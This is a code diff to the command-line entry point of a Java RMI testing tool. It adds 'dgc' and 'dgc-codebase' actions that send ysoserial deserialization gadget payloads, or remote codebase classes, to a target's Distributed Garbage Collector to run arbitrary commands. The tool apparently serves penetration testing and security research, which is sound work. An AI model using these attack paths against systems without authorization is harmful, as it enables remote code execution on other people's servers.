@@ -15,6 +15,7 @@ import de.qtc.rmg.internal.MethodCandidate;
 import de.qtc.rmg.io.Formatter;
 import de.qtc.rmg.io.Logger;
 import de.qtc.rmg.io.WordlistHandler;
+import de.qtc.rmg.operations.DGCClient;
 import de.qtc.rmg.operations.MethodAttacker;
 import de.qtc.rmg.operations.MethodGuesser;
 import de.qtc.rmg.utils.RMGUtils;
@@ -41,7 +42,7 @@ public class Starter {
         if( parser.getArgumentCount() >= 3 ) {
             action = parser.getPositionalString(2);
 
-            if( action.equals("attack") || action.equals("codebase")) {
+            if( action.equals("attack") || action.contains("codebase")) {
                 parser.checkArgumentCount(5);
 
                 if(!commandLine.hasOption("signature")) {
@@ -50,7 +51,7 @@ public class Starter {
                 }
             }
 
-            if( action.equals("codebase" )) {
+            if( action.contains("codebase" )) {
                 String serverAddress = parser.getPositionalString(3);
 
                 if( !serverAddress.startsWith("http") )
@@ -93,18 +94,24 @@ public class Starter {
         }
 
         Formatter format = new Formatter(commandLine.hasOption("json"));
-        RMIWhisperer rmi = new RMIWhisperer();
+        RMIWhisperer rmi = new RMIWhisperer(host, port, sslValue, followRedirect);
 
         RMGUtils.init();
         RMGUtils.enableCodebase();
         RMGUtils.disableWarning();
 
-        rmi.connect(host, port, sslValue, followRedirect);
-        String[] boundNames = rmi.getBoundNames();
+        String[] boundNames = null;
+        HashMap<String,String> allClasses = null;
+        ArrayList<HashMap<String,String>> boundClasses = null;
 
-        ArrayList<HashMap<String,String>> boundClasses = rmi.getClassNames(boundNames);
-        HashMap<String,String> allClasses = (HashMap<String, String>) boundClasses.get(0).clone();
-        allClasses.putAll(boundClasses.get(1));
+        if( !action.contains("dgc") ) {
+            rmi.connect();
+            boundNames = rmi.getBoundNames(boundName);
+
+            boundClasses = rmi.getClassNames(boundNames);
+            allClasses = (HashMap<String, String>) boundClasses.get(0).clone();
+            allClasses.putAll(boundClasses.get(1));
+        }
 
         MethodCandidate candidate = null;
         if( functionSignature != null ) {
@@ -185,6 +192,7 @@ public class Starter {
                 break;
 
             case "attack":
+            case "dgc":
 
                 String gadget = parser.getPositionalString(3);
                 String command = parser.getPositionalString(4);
@@ -197,12 +205,19 @@ public class Starter {
                 }
 
                 Object payload = RMGUtils.getPayloadObject(ysoserialPath, gadget, command);
-                MethodAttacker attacker = new MethodAttacker(rmi, allClasses, candidate);
-                attacker.attack(payload, boundName, argumentPos, "ysoserial", legacyMode);
+
+                if( action.equals("attack") ) {
+                    MethodAttacker attacker = new MethodAttacker(rmi, allClasses, candidate);
+                    attacker.attack(payload, boundName, argumentPos, "ysoserial", legacyMode);
+                } else {
+                    DGCClient dgc = new DGCClient(rmi);
+                    dgc.attackCleanCall(payload);
+                }
 
                 break;
 
             case "codebase":
+            case "dgc-codebase":
 
                 String className = parser.getPositionalString(4);
 
@@ -218,8 +233,13 @@ public class Starter {
                     RMGUtils.exit();
                 }
 
-                attacker = new MethodAttacker(rmi, allClasses, candidate);
-                attacker.attack(payload, boundName, argumentPos, "codebase", legacyMode);
+                if( action.equals("codebase") ) {
+                    MethodAttacker attacker = new MethodAttacker(rmi, allClasses, candidate);
+                    attacker.attack(payload, boundName, argumentPos, "codebase", legacyMode);
+                } else {
+                    DGCClient dgc = new DGCClient(rmi);
+                    dgc.codebaseCleanCall(payload);
+                }
 
                 break;
 
@@ -231,6 +251,10 @@ public class Starter {
                 format.listBoundNames(boundNames, boundClasses);
                 Logger.println("");
                 format.listCodeases();
+                Logger.println("");
+
+                DGCClient dgc = new DGCClient(rmi);
+                dgc.enumCleanCall();
         }
     }
 }
